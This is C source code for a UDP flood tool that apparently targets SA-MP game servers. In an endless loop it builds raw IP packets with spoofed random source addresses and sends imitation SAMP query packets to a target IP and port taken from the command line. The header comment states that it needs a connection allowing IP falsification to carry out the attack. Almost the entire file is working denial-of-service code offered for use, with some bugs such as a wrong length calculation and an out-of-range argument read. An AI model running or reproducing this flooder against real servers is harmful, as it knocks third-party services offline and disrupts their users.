//====BY FR4NK1T0H/W4CH1CH0RR0 - FSAMP----//
/*The script needs a connection that allows for the falsification of IP addresses to be able to make such an attack.
The default of Mark1, is that its checksum is bad, and does not automate the 32-byte packet of the cookie. (In mark2 this does not happen)*/

//##############################GNU LICENCE
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
 
#define LEN 512
 
typedef unsigned short u16;
typedef unsigned long u32;
 
//2nd
unsigned short csum (unsigned short *buf, int nwords);
uint16_t udp_checksum(const struct iphdr  *ip,
        const struct udphdr *udp,
        const uint16_t *buf);
 
 
unsigned char ip[4];
 
void makeArrayIP(char* inIP, char *outIP){
    short i,nTemp=0; char cbool=0;
    for(i=0;inIP[i] != NULL;i++){
        if(inIP[i] != '.'){
            nTemp = nTemp*10 + (short)(inIP[i] - '0');
        }else{
            outIP[cbool] = (char) nTemp;
            nTemp = 0; /*Reiniciar el valor temporal*/
            cbool++;
           }
     
 
    }
    outIP[cbool] = (char) nTemp;
}
 
 

int main(int argc, char * argv[])
{
 
    if(argc < 3)
    {
        printf("- Usage %s <IP> <Port>\n", argv[0]);
        exit(1);
    }
   int iprand = 0;
 char packet_dup[4];  
    makeArrayIP(argv[1],&ip[0]);  
    packet_dup[0] = ip[0];
    packet_dup[1] = ip[1];
    packet_dup[2] = ip[2];
    packet_dup[3] = ip[3];
    while(1)
    {
	char ip_d[20];
//sprintf(ip_d, "%d.%d.%d.%d\0", 186, rand() % 240, rand() % 244 , rand() % 248);
    sprintf(ip_d, "%d.%d.%d.%d\0", 186, rand() % 141, rand() % 125 , rand() % 230);
  int s_port = 1024 + (rand() % 14125);
    int PSOURCE = s_port;
    int PDEST = atoi(argv[2]);
    char * SOURCE = ip_d;
    char * DEST = argv[1];
    char * ANSWER = argv[5];
    int s;
    struct sockaddr_in daddr, saddr, answerip;
    char packet[LEN];
    /* point the iphdr to the beginning of the packet */
    struct iphdr *ip = (struct iphdr *)packet;  
    struct udphdr *udp = (struct udphdr *)((void *) ip + sizeof(struct iphdr));
    struct dnshdr *dns = (struct dnshdr *)((void *) udp + sizeof(struct udphdr));
 
    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("error:");
        exit(EXIT_FAILURE);
    }
 
    daddr.sin_family = AF_INET;
    saddr.sin_family = AF_INET;
    daddr.sin_port = htons(PDEST);
    saddr.sin_port = htons(PSOURCE);
    inet_pton(AF_INET, DEST, (struct in_addr *)&daddr.sin_addr.s_addr);
    inet_pton(AF_INET, SOURCE, (struct in_addr *)&saddr.sin_addr.s_addr);
 
    memset(daddr.sin_zero, 0, sizeof(daddr.sin_zero));
    memset(saddr.sin_zero, 0, sizeof(saddr.sin_zero));
    memset(udp, 0, sizeof(struct udphdr));
    memset(ip, 0, sizeof(struct iphdr));
 
    ip->ihl = 5; //header length
    ip->version = 4;
    ip->tos = 0x0;
    ip->id = 0;
    ip->frag_off = 0;  
    ip->ttl = rand() % 200;          /* default value */
    ip->protocol = 17;  //IPPROTO_RAW;  /* protocol at L4 */
    ip->check = 0;          /* not needed in iphdr */
    ip->saddr = saddr.sin_addr.s_addr;
    ip->daddr = daddr.sin_addr.s_addr;
 
    udp->source = htons(PSOURCE);
    udp->dest = htons (PDEST);
 
       char incoming[] = {
       0x33, 0xfe, 0xe0, 0x7d, 0x33, 0xfe, 0xe0, 0x7d, 0x61, 0x1e, 0x69 };
    int sizedata = sizeof(incoming);
   
    char * packet_pos = ((void *) udp) + sizeof(struct udphdr);
   
   
    memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
 
    packet_pos[0] = 0x53;  
    packet_pos[1] = 0x41;
    packet_pos[2] = 0x4d;
    packet_pos[3] = 0x50;  
    packet_pos[4] = packet_dup[0];
    packet_pos[5] = packet_dup[1];
    packet_pos[6] = packet_dup[2];
    packet_pos[7] = packet_dup[3];
    packet_pos[8] = (char)(PDEST & 0xFFFF);
    packet_pos[9] = (char)(PDEST >> 8 & 0xFFFF);
    packet_pos[10] = 0x69;
  
    int sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
 
    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);
 
    int optval = 1;
 
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int))
            < 0)
        perror ("IP HDRINCL");
 
        int sizepacket = sizeof(struct iphdr) + sizeudpdata;
       memcpy((void *)udp + sizeof(struct udphdr), (char *)packet_pos, 11);
sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;
 
/*#################*/
   char query[] = "SAMPxxxxxi";
        sizepacket = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(query);
        memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
    packet_pos[0] = 0x53;  
    packet_pos[1] = 0x41;
    packet_pos[2] = 0x4d;
    packet_pos[3] = 0x50;  
    packet_pos[4] = packet_dup[0];
    packet_pos[5] = packet_dup[1];
    packet_pos[6] = packet_dup[2];
    packet_pos[7] = packet_dup[3];
    packet_pos[8] = (char)(PDEST & 0xFFFF);
    packet_pos[9] = (char)(PDEST >> 8 & 0xFFFF);
    packet_pos[10] = 0x63;
     memcpy((void *)udp + sizeof(struct udphdr), (char *)packet_pos, 11);
	    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);
      
sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;
     
      /*#################*/
     
      char query_r[] = "SAMPxxxxxr";
        sizepacket = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(query_r);
        memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
    packet_pos[0] = 0x53;  
    packet_pos[1] = 0x41;
    packet_pos[2] = 0x4d;
    packet_pos[3] = 0x50;  
       packet_pos[4] = packet_dup[0];
    packet_pos[5] = packet_dup[1];
    packet_pos[6] = packet_dup[2];
    packet_pos[7] = packet_dup[3];
    packet_pos[8] = (char)(PDEST & 0xFFFF);
    packet_pos[9] = (char)(PDEST >> 8 & 0xFFFF);
    packet_pos[10] = 0x72;
    packet_pos[11] = 0x00;
      memcpy((void *)udp + sizeof(struct udphdr), (char *)packet_pos, 11);
	    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);


      sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;
       /*#################*/      
       
        char query_c[15] = "SAMPxxxxxcxxxx";
        sizepacket = sizeof(struct iphdr) + sizeof(struct udphdr) + 15;
           ip->tot_len = htons(sizeof(sizepacket));  
    udp->len = htons(sizeof(struct udphdr) + sizedata + 4);
 
        memset(((void *) udp) + sizeof(struct udphdr), 'A', 15);
    packet_pos[0] = 0x53;  
    packet_pos[1] = 0x41;
    packet_pos[2] = 0x4d;
    packet_pos[3] = 0x50;  
    packet_pos[4] = packet_dup[0];
    packet_pos[5] = packet_dup[1];
    packet_pos[6] = packet_dup[2];
    packet_pos[7] = packet_dup[3];
    packet_pos[8] = (char)(PDEST & 0xFFFF);
    packet_pos[9] = (char)(PDEST >> 8 & 0xFFFF);
    packet_pos[10] = 0x70;
    packet_pos[11] = (char)(rand() & 0xFFFF);
    packet_pos[12] = (char)(rand() >> 8 & 0xFFFF);
    packet_pos[13] = (char)(rand() & 0xFFFF);
    packet_pos[14] = (char)(rand() >> 8 & 0xFFFF);
  memcpy((void *)udp + sizeof(struct udphdr), (char *)packet_pos, 15);
	    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);


      sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;
      /*#################*/
      
        char bots[4] = "xxx";
        sizepacket = sizeof(struct iphdr) + sizeof(struct udphdr) + 4;
           ip->tot_len = htons(sizeof(sizepacket));
    udp->len = htons(sizeof(struct udphdr) + 4);
 
        memset(((void *) udp) + sizeof(struct udphdr), 'A', 4);
    packet_pos[0] = 0x08;  
    packet_pos[1] = 0x1e;
    packet_pos[2] = 0xaa;
    packet_pos[3] = 0xda;  
  memcpy((void *)udp + sizeof(struct udphdr), (char *)packet_pos, 4);
	    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);


      sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));
     
      /*#################*/
     
      
 	usleep(10000);
            close(s);
    }
    exit(EXIT_SUCCESS);
}
 
//http://www.linuxquestions.org/questions/linux-networking-3/udp-checksum-algorithm-845618/
// === CHECKSUM OFF
struct pseudo_hdr {
    u_int32_t source;
    u_int32_t dest;
    u_int8_t zero; //reserved, check http://www.rhyshaden.com/udp.htm
    u_int8_t protocol;
    u_int16_t udp_length;
};
 
uint16_t udp_checksum(const struct iphdr  *ip,
        const struct udphdr *udp,
        const uint16_t *buf)
{
    //take in account padding if necessary
    int calculated_length = ntohs(udp->len)%2 == 0 ? ntohs(udp->len) : ntohs(udp->len) + 1;
 
    struct pseudo_hdr ps_hdr = {0};
    bzero (&ps_hdr, sizeof(struct pseudo_hdr));
    uint8_t data[sizeof(struct pseudo_hdr) + calculated_length];
    bzero (data, sizeof(struct pseudo_hdr) + calculated_length );
 
    ps_hdr.source = ip->saddr;
    ps_hdr.dest = ip->daddr;
    ps_hdr.protocol = IPPROTO_UDP; //17
    ps_hdr.udp_length = udp->len;
 
    memcpy(data, &ps_hdr, sizeof(struct pseudo_hdr));
    memcpy(data + sizeof(struct pseudo_hdr), buf, ntohs(udp->len) ); //the remaining bytes are set to 0
 
    return csum((uint16_t *)data, sizeof(data)/2);
}
 
/* Not my code */
unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum;
 
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
 
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}
